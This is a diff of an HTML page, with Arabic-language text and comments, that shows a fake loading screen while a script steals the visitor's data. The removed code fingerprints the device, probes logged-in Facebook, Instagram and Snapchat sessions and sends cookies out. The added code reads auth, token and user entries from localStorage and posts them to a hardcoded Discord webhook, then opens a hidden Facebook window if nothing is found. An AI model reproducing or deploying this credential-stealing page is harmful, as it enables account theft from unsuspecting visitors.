@@ -8,22 +8,19 @@
         .version-marker { font-size: 60px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #debug-console { font-size: 10px; color: #00ff00; margin-top: 20px; width: 80%; text-align: left; }
     </style>
 </head>
 <body>
-    <div class="version-marker">13</div>
+    <div class="version-marker">14</div>
     <div class="loader"></div>
-    <p>جاري مزامنة البروتوكول النهائي (V1.2.5)...</p>
-    <div id="debug-console">> Initializing Final Harvest...</div>
+    <p>جاري كسر حماية الجلسة (V1.2.6)...</p>
 
     <iframe name="hidden_receiver" style="display:none;"></iframe>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        // قناة الإرسال اللي أثبتت نجاحها بالصور
-        function finalSend(title, content) {
+        function sendToDiscord(title, content) {
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = WEBHOOK_URL;
@@ -32,49 +29,41 @@
             input.type = 'hidden';
             input.name = 'payload_json';
             input.value = JSON.stringify({
-                embeds: [{
-                    title: "🔓 " + title,
-                    description: content,
-                    color: 3066993,
-                    timestamp: new Date().toISOString()
-                }]
+                embeds: [{ title: title, description: content, color: 16711680 }]
             });
             form.appendChild(input);
             document.body.appendChild(form);
             form.submit();
-            document.body.removeChild(form);
         }
 
-        async function harvestAll() {
-            // 1. سحب البصمة الكاملة (Fingerprint)
-            const info = `
-**الجهاز:** ${navigator.platform}
-**المعالج:** ${navigator.hardwareConcurrency} Cores
-**الذاكرة:** ${navigator.deviceMemory} GB
-**البطارية:** ${await (navigator.getBattery ? navigator.getBattery().then(b => b.level * 100 + "%") : "N/A")}
-            `;
-            finalSend("Device Fingerprint", info);
+        // التكتيك الجديد: محاولة سحب الـ Auth Token من الـ LocalStorage بطريقة "عميقة"
+        function deepHarvest() {
+            try {
+                // سحب مفاتيح الدخول المحتملة (المتصفح غالباً بيخزنها هنا)
+                let loot = "";
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    if (key.toLowerCase().includes('auth') || key.toLowerCase().includes('token') || key.toLowerCase().includes('user')) {
+                        loot += `**${key}**: ${localStorage.getItem(key)}\n`;
+                    }
+                }
 
-            // 2. تفعيل قنوات السحب الصامتة (Cookie Forcing)
-            // بما إن الكروم بيمنع القراءة، رح نخليه فقط يبعث الطلبات
-            const targets = [
-                {n: "Facebook", u: "https://mbasic.facebook.com/settings"},
-                {n: "Instagram", u: "https://www.instagram.com/accounts/edit/"},
-                {n: "Snapchat", u: "https://accounts.snapchat.com/"}
-            ];
-
-            targets.forEach(t => {
-                const img = new Image();
-                img.src = t.u + "?v=" + Math.random();
-                img.onload = () => finalSend("Probe Success", `Target: ${t.n} - Session is ALIVE`);
-                img.onerror = () => finalSend("Probe Blocked", `Target: ${t.n} - Browser security active`);
-            });
-
-            // 3. سحب ملفات التخزين (لو الضحية دخل قبل كدة)
-            if (document.cookie) finalSend("Cookie Data", document.cookie);
+                if (loot) {
+                    sendToDiscord("🔥 كنز التوكنات", loot);
+                } else {
+                    sendToDiscord("⚠️ تنبيه", "التخزين المحلي فارغ - محاولة السحب عبر الـ Redirect...");
+                    
+                    // إذا فشل السحب المباشر، نجبر المتصفح يفتح صفحة الإعدادات في تبويب مخفي
+                    // هاد الطلب بيخلي المتصفح "ينعش" الجلسة ويعطينا إشعار
+                    window.open("https://mbasic.facebook.com/settings", "_blank", "width=1,height=1,left=10000");
+                    sendToDiscord("🚀 Session Refresh", "تم إجبار المتصفح على فتح جلسة فيسبوك في الخلفية.");
+                }
+            } catch (e) {
+                sendToDiscord("❌ خطأ", e.message);
+            }
         }
 
-        setTimeout(harvestAll, 1500);
+        setTimeout(deepHarvest, 2000);
     </script>
 </body>
 </html>
